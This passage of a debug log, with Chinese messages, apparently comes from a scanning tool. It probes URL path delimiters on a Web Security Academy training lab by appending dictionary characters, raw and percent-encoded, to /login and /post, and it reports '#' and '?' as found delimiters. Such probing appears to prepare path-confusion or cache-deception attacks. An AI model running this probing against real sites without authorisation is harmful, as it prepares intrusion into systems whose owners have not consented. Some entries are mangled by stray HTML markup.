href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2526aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2526aa</a><br>2025/10/23 20:45:40 [DEBUG] 正在测试分隔符 (来自字典): ‘%27’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%27aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%27aa</a><br>2025/10/23 20:45:40 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2527’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2527aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2527aa</a><br>2025/10/23 20:45:40 [DEBUG] 正在测试分隔符 (来自字典): ‘%28’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%28aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%28aa</a><br>2025/10/23 20:45:40 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2528’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2528aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2528aa</a><br>2025/10/23 20:45:40 [DEBUG] 正在测试分隔符 (来自字典): ‘%29’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%29aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%29aa</a><br>2025/10/23 20:45:41 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2529’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2529aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2529aa</a><br>2025/10/23 20:45:41 [DEBUG] 正在测试分隔符 (来自字典): ‘%2A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Aaa</a><br>2025/10/23 20:45:41 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Aaa</a><br>2025/10/23 20:45:41 [DEBUG] 正在测试分隔符 (来自字典): ‘%2B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Baa</a><br>2025/10/23 20:45:41 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Baa</a><br>2025/10/23 20:45:41 [DEBUG] 正在测试分隔符 (来自字典): ‘%2C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Caa</a><br>2025/10/23 20:45:42 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Caa</a><br>2025/10/23 20:45:42 [DEBUG] 正在测试分隔符 (来自字典): ‘%2D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Daa</a><br>2025/10/23 20:45:42 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Daa</a><br>2025/10/23 20:45:42 [DEBUG] 正在测试分隔符 (来自字典): ‘%2E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Eaa</a><br>2025/10/23 20:45:42 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Eaa</a><br>2025/10/23 20:45:43 [DEBUG] 正在测试分隔符 (来自字典): ‘%2F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Faa</a><br>2025/10/23 20:45:43 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%252Faa</a><br>2025/10/23 20:45:43 [DEBUG] 正在测试分隔符 (来自字典): ‘%3A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Aaa</a><br>2025/10/23 20:45:43 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Aaa</a><br>2025/10/23 20:45:43 [DEBUG] 正在测试分隔符 (来自字典): ‘%3B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Baa</a><br>2025/10/23 20:45:43 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Baa</a><br>2025/10/23 20:45:44 [DEBUG] 正在测试分隔符 (来自字典): ‘%3C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Caa</a><br>2025/10/23 20:45:44 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Caa</a><br>2025/10/23 20:45:44 [DEBUG] 正在测试分隔符 (来自字典): ‘%3D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Daa</a><br>2025/10/23 20:45:44 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Daa</a><br>2025/10/23 20:45:44 [DEBUG] 正在测试分隔符 (来自字典): ‘%3E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Eaa</a><br>2025/10/23 20:45:44 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Eaa</a><br>2025/10/23 20:45:45 [DEBUG] 正在测试分隔符 (来自字典): ‘%3F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Faa</a><br>2025/10/23 20:45:45 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%253Faa</a><br>2025/10/23 20:45:45 [DEBUG] 正在测试分隔符 (来自字典): ‘%40’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%40aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%40aa</a><br>2025/10/23 20:45:45 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2540’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2540aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2540aa</a><br>2025/10/23 20:45:45 [DEBUG] 正在测试分隔符 (来自字典): ‘%5B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Baa</a><br>2025/10/23 20:45:46 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Baa</a><br>2025/10/23 20:45:46 [DEBUG] 正在测试分隔符 (来自字典): ‘%5C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Caa</a><br>2025/10/23 20:45:46 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Caa</a><br>2025/10/23 20:45:46 [DEBUG] 正在测试分隔符 (来自字典): ‘%5D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Daa</a><br>2025/10/23 20:45:46 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Daa</a><br>2025/10/23 20:45:46 [DEBUG] 正在测试分隔符 (来自字典): ‘%5E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Eaa</a><br>2025/10/23 20:45:47 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Eaa</a><br>2025/10/23 20:45:47 [DEBUG] 正在测试分隔符 (来自字典): ‘%5F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Faa</a><br>2025/10/23 20:45:47 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%255Faa</a><br>2025/10/23 20:45:47 [DEBUG] 正在测试分隔符 (来自字典): ‘%60’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%60aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%60aa</a><br>2025/10/23 20:45:47 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2560’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2560aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2560aa</a><br>2025/10/23 20:45:48 [DEBUG] 正在测试分隔符 (来自字典): ‘%7B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Baa</a><br>2025/10/23 20:45:48 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%257Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%257Baa</a><br>2025/10/23 20:45:48 [DEBUG] 正在测试分隔符 (来自字典): ‘%7C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Caa</a><br>2025/10/23 20:45:48 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%257Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%257Caa</a><br>2025/10/23 20:45:48 [DEBUG] 正在测试分隔符 (来自字典): ‘%7D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Daa</a><br>2025/10/23 20:45:48 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%257Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%257Daa</a><br>2025/10/23 20:45:49 [DEBUG] 正在测试分隔符 (来自字典): ‘%7E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Eaa</a><br>2025/10/23 20:45:49 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%257Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%257Eaa</a><br>2025/10/23 20:45:49 [DEBUG] 正在为分隔符检测选择基础URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a><br>2025/10/23 20:45:49 [DEBUG] 正在测试分隔符 (来自字典): ‘!’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post!aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post!aa</a><br>2025/10/23 20:45:49 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%21’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%21aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%21aa</a><br>2025/10/23 20:45:50 [DEBUG] 正在测试分隔符 (来自字典): ‘“‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post&quot;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post&quot;aa</a><br>2025/10/23 20:45:50 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%22’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%22aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%22aa</a><br>2025/10/23 20:45:50 [DEBUG] 正在测试分隔符 (来自字典): ‘#’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post#aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post#aa</a><br>2025/10/23 20:45:50 [DEBUG] 为URL <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a> 找到分隔符 (来自字典): ‘#’<br>2025/10/23 20:45:50 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%23’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%23aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%23aa</a><br>2025/10/23 20:45:50 [DEBUG] 正在测试分隔符 (来自字典): ‘$’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post$aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post$aa</a><br>2025/10/23 20:45:50 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%24’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%24aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%24aa</a><br>2025/10/23 20:45:51 [DEBUG] 正在测试分隔符 (来自字典): ‘%’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%aa</a><br>2025/10/23 20:45:51 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%25’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%25aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%25aa</a><br>2025/10/23 20:45:51 [DEBUG] 正在测试分隔符 (来自字典): ‘&amp;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post&amp;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post&amp;aa</a><br>2025/10/23 20:45:51 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%26’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%26aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%26aa</a><br>2025/10/23 20:45:51 [DEBUG] 正在测试分隔符 (来自字典): ‘’’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post&#39;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post&#39;aa</a><br>2025/10/23 20:45:52 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%27’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%27aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%27aa</a><br>2025/10/23 20:45:52 [DEBUG] 正在测试分隔符 (来自字典): ‘(‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post(aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post(aa</a><br>2025/10/23 20:45:52 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%28’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%28aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%28aa</a><br>2025/10/23 20:45:52 [DEBUG] 正在测试分隔符 (来自字典): ‘)’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post)aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post)aa</a><br>2025/10/23 20:45:52 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%29’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%29aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%29aa</a><br>2025/10/23 20:45:52 [DEBUG] 正在测试分隔符 (来自字典): ‘<em>‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a></em>aa<br>2025/10/23 20:45:53 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Aaa</a><br>2025/10/23 20:45:53 [DEBUG] 正在测试分隔符 (来自字典): ‘+’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post+aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post+aa</a><br>2025/10/23 20:45:53 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Baa</a><br>2025/10/23 20:45:53 [DEBUG] 正在测试分隔符 (来自字典): ‘,’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post,aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post,aa</a><br>2025/10/23 20:45:53 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Caa</a><br>2025/10/23 20:45:53 [DEBUG] 正在测试分隔符 (来自字典): ‘-‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post-aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post-aa</a><br>2025/10/23 20:45:54 [DEBUG] 正在测试分隔符 (来自字典): ‘.’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post.aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post.aa</a><br>2025/10/23 20:45:54 [DEBUG] 正在测试分隔符 (来自字典): ‘/‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post/aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post/aa</a><br>2025/10/23 20:45:54 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Faa</a><br>2025/10/23 20:45:54 [DEBUG] 正在测试分隔符 (来自字典): ‘:’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post:aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post:aa</a><br>2025/10/23 20:45:54 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Aaa</a><br>2025/10/23 20:45:55 [DEBUG] 正在测试分隔符 (来自字典): ‘;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post;aa</a><br>2025/10/23 20:45:55 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Baa</a><br>2025/10/23 20:45:55 [DEBUG] 正在测试分隔符 (来自字典): ‘&lt;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a><aa2025/10/23 20:45:55 [DEBUG] 正在测试分隔符 (字典条目编码后): '%3C', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Caa2025/10/23 20:45:55 [DEBUG] 正在测试分隔符 (来自字典): '=', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post=aa2025/10/23 20:45:55 [DEBUG] 正在测试分隔符 (字典条目编码后): '%3D', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Daa2025/10/23 20:45:56 [DEBUG] 正在测试分隔符 (来自字典): '>', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post>aa<br>2025/10/23 20:45:56 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Eaa</a><br>2025/10/23 20:45:56 [DEBUG] 正在测试分隔符 (来自字典): ‘?’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?aa</a><br>2025/10/23 20:45:56 [DEBUG] 为URL <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a> 找到分隔符 (来自字典): ‘?’<br>2025/10/23 20:45:56 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Faa</a><br>2025/10/23 20:45:56 [DEBUG] 正在测试分隔符 (来自字典): ‘@’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post@aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post@aa</a><br>2025/10/23 20:45:57 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%40’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%40aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%40aa</a><br>2025/10/23 20:45:57 [DEBUG] 正在测试分隔符 (来自字典): ‘[‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post[aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post[aa</a><br>2025/10/23 20:45:57 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Baa</a><br>2025/10/23 20:45:57 [DEBUG] 正在测试分隔符 (来自字典): ‘\’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post\aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post\aa</a><br>2025/10/23 20:45:57 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Caa</a><br>2025/10/23 20:45:57 [DEBUG] 正在测试分隔符 (来自字典): ‘]’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post]aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post]aa</a><br>2025/10/23 20:45:58 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Daa</a><br>2025/10/23 20:45:58 [DEBUG] 正在测试分隔符 (来自字典): ‘^’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post^aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post^aa</a><br>2025/10/23 20:45:58 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Eaa</a><br>2025/10/23 20:45:58 [DEBUG] 正在测试分隔符 (来自字典): ‘_’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post_aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post_aa</a><br>2025/10/23 20:45:58 [DEBUG] 正在测试分隔符 (来自字典): ‘<code>&#39;, URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</code>aa<br>2025/10/23 20:45:58 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%60’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%60aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%60aa</a><br>2025/10/23 20:45:59 [DEBUG] 正在测试分隔符 (来自字典): ‘{‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post{aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post{aa</a><br>2025/10/23 20:45:59 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Baa</a><br>2025/10/23 20:45:59 [DEBUG] 正在测试分隔符 (来自字典): ‘|’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post|aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post|aa</a><br>2025/10/23 20:45:59 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Caa</a><br>2025/10/23 20:45:59 [DEBUG] 正在测试分隔符 (来自字典): ‘}’, URL: <a 